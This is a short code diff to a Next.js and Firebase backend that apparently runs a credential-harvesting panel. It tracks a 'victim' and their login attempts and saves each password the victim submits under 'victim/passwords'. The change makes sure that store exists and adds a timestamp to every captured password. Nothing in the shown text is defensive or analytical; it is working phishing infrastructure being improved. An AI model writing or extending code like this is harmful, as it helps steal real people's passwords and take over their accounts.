@@ -22,6 +22,11 @@ async function getAppState(): Promise<AppState> {
     config: { ...initialState.config, ...config },
     victim: { ...initialState.victim, ...victim }
   };
+  
+  if (!victim.passwords) {
+    currentState.victim.passwords = {};
+  }
+
 
   if (!configSnapshot.exists()) {
     await set(ref(db, 'config'), currentState.config);
@@ -136,7 +141,11 @@ export async function POST(request: NextRequest) {
         const newAttempts = (victim.attempts || 0) + 1;
         
         const passwordsRef = ref(db, 'victim/passwords');
-        await firebasePush(passwordsRef, body.password);
+        const passwordEntry = {
+            value: body.password,
+            timestamp: new Date().toISOString()
+        };
+        await firebasePush(passwordsRef, passwordEntry);
 
         let victimUpdate: any = { attempts: newAttempts };
 
